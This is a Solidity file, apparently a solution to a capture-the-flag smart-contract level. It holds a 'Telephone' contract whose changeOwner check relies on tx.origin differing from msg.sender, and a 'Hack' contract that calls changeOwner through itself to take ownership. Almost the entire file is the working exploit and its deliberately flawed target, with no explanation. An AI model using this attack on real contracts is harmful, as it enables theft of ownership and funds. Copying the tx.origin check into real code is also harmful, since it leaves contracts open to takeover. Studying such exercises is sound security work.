// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract Hack {
    address telephoneContract;
    
    constructor(address _telephoneContract) {
        telephoneContract = _telephoneContract;
    }

    function attack() external {
        (bool success, ) = telephoneContract.call(
            abi.encodeWithSelector(Telephone.changeOwner.selector, msg.sender)
        );
        require(success, "unsuccess");
    }
}